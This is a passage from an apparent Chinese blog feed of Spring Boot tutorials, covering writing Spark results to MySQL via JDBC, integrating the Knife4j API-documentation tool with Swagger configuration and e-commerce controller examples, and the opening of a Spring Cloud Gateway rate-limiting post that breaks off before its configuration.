<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Dataset&lt;Row&gt; result = data.groupBy(<span class="string">&quot;user_id&quot;</span>).count();</span><br></pre></td></tr></table></figure>
<h2 id="数据写入：将处理结果存回数据库"><a href="#数据写入：将处理结果存回数据库" class="headerlink" title="数据写入：将处理结果存回数据库"></a>数据写入：将处理结果存回数据库</h2><p>最后，将处理后的数据写回到 MySQL 数据库或者以其他形式进行展示。这里重点讲解写回 MySQL 数据库的操作。同样在 DataProcessingService 类中添加数据写入方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.spark.sql.Dataset;</span><br><span class="line"><span class="keyword">import</span> org.apache.spark.sql.Row;</span><br><span class="line"><span class="keyword">import</span> org.apache.spark.sql.SparkSession;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DataProcessingService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeDataToMySQL</span><span class="params">(Dataset&lt;Row&gt; processedData)</span> &#123;</span><br><span class="line">        <span class="type">SparkSession</span> <span class="variable">spark</span> <span class="operator">=</span> SparkSession.builder()</span><br><span class="line">               .appName(<span class="string">&quot;WriteToMySQL&quot;</span>)</span><br><span class="line">               .master(<span class="string">&quot;local[*]&quot;</span>)</span><br><span class="line">               .getOrCreate();</span><br><span class="line">        processedData.write()</span><br><span class="line">               .format(<span class="string">&quot;jdbc&quot;</span>)</span><br><span class="line">               .option(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;jdbc:mysql://localhost:3306/your_database?useUnicode=true&amp;characterEncoding=utf-8&amp;serverTimezone=Asia/Shanghai&quot;</span>)</span><br><span class="line">               .option(<span class="string">&quot;dbtable&quot;</span>, <span class="string">&quot;result_table&quot;</span>)</span><br><span class="line">               .option(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;your_username&quot;</span>)</span><br><span class="line">               .option(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;your_password&quot;</span>)</span><br><span class="line">               .mode(<span class="string">&quot;append&quot;</span>)</span><br><span class="line">               .save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mode(“append”) 表示以追加的方式将数据写入表中，如果表不存在会自动创建；如果希望覆盖原有数据，可以使用 mode(“overwrite”) ；mode(“ignore”) 则表示如果数据已存在，忽略此次写入操作。result_table 替换为实际要写入数据的表名。</p>
<p>通过以上详细步骤，我们就能在 Spring Boot 中成功整合 Apache Spark 技术实现链接 MySQL 数据库的数据处理。在实际的互联网大厂项目开发中，这种技术整合能够显著提升数据处理的效率和性能，满足企业对海量数据处理的需求。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot2集成四【Knife4j增强框架】</title>
    <url>/cnblogs.github.io/p/4b15.html</url>
    <content><![CDATA[<p>Knife4j是基于Swagger的API文档增强工具，为Java开发者提供了一套更强大、更美观的API文档解决方案。它就像是API文档界的”瑞士军刀”，不仅保留了Swagger的所有功能，还增加了许多实用特性。</p>
<h2 id="Spring-Boot基础集成Knife4j"><a href="#Spring-Boot基础集成Knife4j" class="headerlink" title="Spring Boot基础集成Knife4j"></a>Spring Boot基础集成Knife4j</h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1 环境准备"></a>1 环境准备</h3><ul>
<li>创建Spring Boot项目（2.3.x以上版本）</li>
<li>确保项目已包含Spring MVC依赖</li>
</ul>
<h3 id="2-添加Maven依赖"><a href="#2-添加Maven依赖" class="headerlink" title="2 添加Maven依赖"></a>2 添加Maven依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Knife4j核心依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.xiaoymin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>knife4j-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Springfox Swagger依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="3-基础配置类"><a href="#3-基础配置类" class="headerlink" title="3 基础配置类"></a>3 基础配置类</h3><p>创建Swagger配置类SwaggerConfig.java：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableSwagger2WebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SwaggerConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Docket <span class="title function_">createRestApi</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">                <span class="comment">// 指定API的基本信息</span></span><br><span class="line">                .apiInfo(apiInfo())</span><br><span class="line">                <span class="comment">// 选择哪些接口暴露给Swagger</span></span><br><span class="line">                .select()</span><br><span class="line">                <span class="comment">// 扫描所有有注解的api</span></span><br><span class="line">                .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class))</span><br><span class="line">                <span class="comment">// 扫描指定包中的类</span></span><br><span class="line">                .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.example.controller&quot;</span>))</span><br><span class="line">                <span class="comment">// 扫描所有</span></span><br><span class="line">                .paths(PathSelectors.any())</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ApiInfo <span class="title function_">apiInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApiInfoBuilder</span>()</span><br><span class="line">                .title(<span class="string">&quot;电商系统API文档&quot;</span>)  <span class="comment">// 文档标题</span></span><br><span class="line">                .description(<span class="string">&quot;电商系统接口文档说明&quot;</span>)  <span class="comment">// 文档描述</span></span><br><span class="line">                .contact(<span class="keyword">new</span> <span class="title class_">Contact</span>(<span class="string">&quot;开发者&quot;</span>, <span class="string">&quot;https://example.com&quot;</span>, <span class="string">&quot;dev@example.com&quot;</span>))  <span class="comment">// 联系人信息</span></span><br><span class="line">                .version(<span class="string">&quot;1.0&quot;</span>)  <span class="comment">// 版本号</span></span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-添加Controller示例"><a href="#4-添加Controller示例" class="headerlink" title="4 添加Controller示例"></a>4 添加Controller示例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/user&quot;)</span></span><br><span class="line"><span class="meta">@Api(tags = &quot;用户管理接口&quot;)</span>  <span class="comment">// Swagger注解，指定模块名称</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;根据ID获取用户&quot;, notes = &quot;传入用户ID，返回用户详细信息&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;User&gt; <span class="title function_">getUserById</span><span class="params">(</span></span><br><span class="line"><span class="params">            <span class="meta">@PathVariable</span> <span class="meta">@ApiParam(value = &quot;用户ID&quot;, example = &quot;1&quot;)</span> Long id)</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟数据</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(id, <span class="string">&quot;张三&quot;</span>, <span class="string">&quot;zhangsan@example.com&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;创建用户&quot;, notes = &quot;传入用户信息，创建新用户&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;User&gt; <span class="title function_">createUser</span><span class="params">(</span></span><br><span class="line"><span class="params">            <span class="meta">@RequestBody</span> <span class="meta">@Valid</span> <span class="meta">@ApiParam(value = &quot;用户信息&quot;, required = true)</span> User user)</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟保存操作</span></span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户实体类</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@ApiModel(&quot;用户实体&quot;)</span>  <span class="comment">// Swagger注解，描述模型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;用户ID&quot;, example = &quot;1&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;用户名&quot;, example = &quot;张三&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;邮箱&quot;, example = &quot;user@example.com&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造方法、getter/setter省略...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5-访问Knife4j文档"><a href="#5-访问Knife4j文档" class="headerlink" title="5 访问Knife4j文档"></a>5 访问Knife4j文档</h3><p>启动应用后，访问以下URL：</p>
<ul>
<li>默认Swagger文档：<a href="http://localhost:8080/swagger-ui.html">http://localhost:8080/swagger-ui.html</a></li>
<li>Knife4j增强文档：<a href="http://localhost:8080/doc.html">http://localhost:8080/doc.html</a></li>
</ul>
<h2 id="Knife4j高级配置与功能"><a href="#Knife4j高级配置与功能" class="headerlink" title="Knife4j高级配置与功能"></a>Knife4j高级配置与功能</h2><h3 id="1-分组功能配置"><a href="#1-分组功能配置" class="headerlink" title="1 分组功能配置"></a>1 分组功能配置</h3><p>在实际开发中，我们可能需要将API按模块分组展示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">userApi</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">            .groupName(<span class="string">&quot;用户模块&quot;</span>)  <span class="comment">// 分组名称</span></span><br><span class="line">            .apiInfo(apiInfo())</span><br><span class="line">            .select()</span><br><span class="line">            .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.example.controller.user&quot;</span>))</span><br><span class="line">            .paths(PathSelectors.any())</span><br><span class="line">            .build();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">orderApi</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">            .groupName(<span class="string">&quot;订单模块&quot;</span>)</span><br><span class="line">            .apiInfo(apiInfo())</span><br><span class="line">            .select()</span><br><span class="line">            .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.example.controller.order&quot;</span>))</span><br><span class="line">            .paths(PathSelectors.any())</span><br><span class="line">            .build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-接口权限控制"><a href="#2-接口权限控制" class="headerlink" title="2 接口权限控制"></a>2 接口权限控制</h3><p>Knife4j支持对文档进行权限控制，保护敏感接口：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.yml配置</span></span><br><span class="line"><span class="attr">knife4j:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">production:</span> <span class="literal">false</span>  <span class="comment"># 生产环境设为true会禁用文档</span></span><br><span class="line">  <span class="attr">basic:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span>     <span class="comment"># 开启基础认证</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">admin</span>  <span class="comment"># 登录用户名</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span> <span class="comment"># 登录密码</span></span><br></pre></td></tr></table></figure>
<h3 id="3-全局参数配置"><a href="#3-全局参数配置" class="headerlink" title="3 全局参数配置"></a>3 全局参数配置</h3><p>配置全局Header参数，如token认证：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">createRestApi</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">            .apiInfo(apiInfo())</span><br><span class="line">            .globalRequestParameters(</span><br><span class="line">                Arrays.asList(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">RequestParameterBuilder</span>()</span><br><span class="line">                        .name(<span class="string">&quot;Authorization&quot;</span>)  <span class="comment">// 参数名</span></span><br><span class="line">                        .description(<span class="string">&quot;认证token&quot;</span>)  <span class="comment">// 描述</span></span><br><span class="line">                        .in(ParameterType.HEADER)  <span class="comment">// 参数位置</span></span><br><span class="line">                        .required(<span class="literal">true</span>)  <span class="comment">// 是否必须</span></span><br><span class="line">                        .build()</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">            .select()</span><br><span class="line">            .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.example.controller&quot;</span>))</span><br><span class="line">            .paths(PathSelectors.any())</span><br><span class="line">            .build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Knife4j进阶功能"><a href="#Knife4j进阶功能" class="headerlink" title="Knife4j进阶功能"></a>Knife4j进阶功能</h2><h3 id="1-接口排序功能"><a href="#1-接口排序功能" class="headerlink" title="1 接口排序功能"></a>1 接口排序功能</h3><p>通过@ApiOperationSupport注解实现接口排序：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/list&quot;)</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;获取用户列表&quot;)</span></span><br><span class="line"><span class="meta">@ApiOperationSupport(order = 1)</span>  <span class="comment">// 数字越小越靠前</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;List&lt;User&gt;&gt; <span class="title function_">getUserList</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 实现逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PostMapping</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;创建用户&quot;)</span></span><br><span class="line"><span class="meta">@ApiOperationSupport(order = 2)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;User&gt; <span class="title function_">createUser</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span> &#123;</span><br><span class="line">    <span class="comment">// 实现逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-接口缓存设置"><a href="#2-接口缓存设置" class="headerlink" title="2 接口缓存设置"></a>2 接口缓存设置</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;获取用户详情&quot;)</span></span><br><span class="line"><span class="meta">@ApiOperationSupport(</span></span><br><span class="line"><span class="meta">    author = &quot;developer&quot;,</span></span><br><span class="line"><span class="meta">    params = @DynamicParameters(</span></span><br><span class="line"><span class="meta">        properties = &#123;</span></span><br><span class="line"><span class="meta">            @DynamicParameter(name = &quot;id&quot;, value = &quot;用户ID&quot;, example = &quot;1&quot;)</span></span><br><span class="line"><span class="meta">        &#125;</span></span><br><span class="line"><span class="meta">    ),</span></span><br><span class="line"><span class="meta">    responses = @DynamicResponseParameters(</span></span><br><span class="line"><span class="meta">        properties = &#123;</span></span><br><span class="line"><span class="meta">            @DynamicParameter(name = &quot;code&quot;, value = &quot;状态码&quot;, example = &quot;200&quot;),</span></span><br><span class="line"><span class="meta">            @DynamicParameter(name = &quot;data&quot;, value = &quot;用户数据&quot;)</span></span><br><span class="line"><span class="meta">        &#125;</span></span><br><span class="line"><span class="meta">    ),</span></span><br><span class="line"><span class="meta">    cache = @ApiOperationCache(time = 60)  // 缓存60秒</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;User&gt; <span class="title function_">getUserById</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span> &#123;</span><br><span class="line">    <span class="comment">// 实现逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-离线文档生成"><a href="#3-离线文档生成" class="headerlink" title="3 离线文档生成"></a>3 离线文档生成</h3><p>通过代码生成离线文档：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> OpenApiResource openApiResource;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/generate&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">generateOfflineDocument</span><span class="params">(HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 获取OpenAPI对象</span></span><br><span class="line">    <span class="type">OpenAPI</span> <span class="variable">openAPI</span> <span class="operator">=</span> openApiResource.getOpenApi();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用Knife4j提供的工具类生成文档</span></span><br><span class="line">    <span class="type">byte</span>[] markdownBytes = Knife4jDocUtil.openApiToMarkdown(openAPI);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置响应头</span></span><br><span class="line">    response.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">    response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=api-doc.md&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 输出文档</span></span><br><span class="line">    response.getOutputStream().write(markdownBytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="实际案例：电商系统API文档"><a href="#实际案例：电商系统API文档" class="headerlink" title="实际案例：电商系统API文档"></a>实际案例：电商系统API文档</h2><h3 id="1-商品模块示例"><a href="#1-商品模块示例" class="headerlink" title="1 商品模块示例"></a>1 商品模块示例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/product&quot;)</span></span><br><span class="line"><span class="meta">@Api(tags = &quot;商品管理&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;分页查询商品&quot;, notes = &quot;支持分页和条件查询&quot;)</span></span><br><span class="line">    <span class="meta">@ApiImplicitParams(&#123;</span></span><br><span class="line"><span class="meta">        @ApiImplicitParam(name = &quot;page&quot;, value = &quot;页码&quot;, defaultValue = &quot;1&quot;),</span></span><br><span class="line"><span class="meta">        @ApiImplicitParam(name = &quot;size&quot;, value = &quot;每页数量&quot;, defaultValue = &quot;10&quot;),</span></span><br><span class="line"><span class="meta">        @ApiImplicitParam(name = &quot;name&quot;, value = &quot;商品名称&quot;, required = false)</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Page&lt;Product&gt;&gt; <span class="title function_">getProducts</span><span class="params">(</span></span><br><span class="line"><span class="params">            <span class="meta">@RequestParam(defaultValue = &quot;1&quot;)</span> <span class="type">int</span> page,</span></span><br><span class="line"><span class="params">            <span class="meta">@RequestParam(defaultValue = &quot;10&quot;)</span> <span class="type">int</span> size,</span></span><br><span class="line"><span class="params">            <span class="meta">@RequestParam(required = false)</span> String name)</span> &#123;</span><br><span class="line">        <span class="comment">// 实现逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/&#123;id&#125;/stock&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;调整库存&quot;, notes = &quot;增加或减少商品库存&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperationSupport(order = 3)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">adjustStock</span><span class="params">(</span></span><br><span class="line"><span class="params">            <span class="meta">@PathVariable</span> Long id,</span></span><br><span class="line"><span class="params">            <span class="meta">@RequestBody</span> <span class="meta">@Valid</span> StockAdjustment adjustment)</span> &#123;</span><br><span class="line">        <span class="comment">// 实现逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ApiModel(&quot;库存调整DTO&quot;)</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StockAdjustment</span> &#123;</span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;调整数量&quot;, example = &quot;10&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> quantity;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;操作类型&quot;, example = &quot;INCREASE&quot;, allowableValues = &quot;INCREASE,DECREASE&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> OperationType type;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;备注&quot;, example = &quot;补货入库&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String remark;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">OperationType</span> &#123;</span><br><span class="line">    INCREASE, DECREASE</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-订单模块示例"><a href="#2-订单模块示例" class="headerlink" title="2 订单模块示例"></a>2 订单模块示例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/order&quot;)</span></span><br><span class="line"><span class="meta">@Api(tags = &quot;订单管理&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;创建订单&quot;, notes = &quot;根据购物车信息创建订单&quot;)</span></span><br><span class="line">    <span class="meta">@ApiResponses(&#123;</span></span><br><span class="line"><span class="meta">        @ApiResponse(code = 400, message = &quot;参数校验失败&quot;),</span></span><br><span class="line"><span class="meta">        @ApiResponse(code = 403, message = &quot;权限不足&quot;)</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Order&gt; <span class="title function_">createOrder</span><span class="params">(</span></span><br><span class="line"><span class="params">            <span class="meta">@RequestBody</span> <span class="meta">@Valid</span> CreateOrderRequest request,</span></span><br><span class="line"><span class="params">            <span class="meta">@RequestHeader(&quot;Authorization&quot;)</span> String token)</span> &#123;</span><br><span class="line">        <span class="comment">// 实现逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&#123;orderNo&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;查询订单详情&quot;, notes = &quot;根据订单号查询订单详情&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperationSupport(order = 1)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Order&gt; <span class="title function_">getOrder</span><span class="params">(</span></span><br><span class="line"><span class="params">            <span class="meta">@PathVariable</span> <span class="meta">@ApiParam(value = &quot;订单号&quot;, example = &quot;ORD20230001&quot;)</span> String orderNo)</span> &#123;</span><br><span class="line">        <span class="comment">// 实现逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ApiModel(&quot;创建订单请求&quot;)</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CreateOrderRequest</span> &#123;</span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;商品项列表&quot;, required = true)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;OrderItem&gt; items;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;收货地址ID&quot;, example = &quot;1&quot;, required = true)</span></span><br><span class="line">    <span class="keyword">private</span> Long addressId;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;备注&quot;, example = &quot;请尽快发货&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String remark;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ApiModel(&quot;订单商品项&quot;)</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OrderItem</span> &#123;</span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;商品ID&quot;, example = &quot;1&quot;, required = true)</span></span><br><span class="line">    <span class="keyword">private</span> Long productId;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;购买数量&quot;, example = &quot;2&quot;, required = true)</span></span><br><span class="line">    <span class="keyword">private</span> Integer quantity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3功能一【限流网关操作】</title>
    <url>/cnblogs.github.io/p/6b77.html</url>
    <content><![CDATA[<h2 id="使用-Spring-Cloud-Gateway-实现限流"><a href="#使用-Spring-Cloud-Gateway-实现限流" class="headerlink" title="使用 Spring Cloud Gateway 实现限流"></a>使用 Spring Cloud Gateway 实现限流</h2><h3 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h3><p>首先，在你的 Spring Boot3 项目的pom.xml文件中，添加 Spring Cloud Gateway 和 Spring Cloud Alibaba 的依赖。这是搭建网关的基础，就好比盖房子要先准备好砖块水泥。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-alibaba-sentinel-gateway-adapter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="配置路由和限流规则"><a href="#配置路由和限流规则" class="headerlink" title="配置路由和限流规则"></a>配置路由和限流规则</h3><p>在application.yml文件中，配置路由规则和限流策略。比如，你可以这样设置：</p>
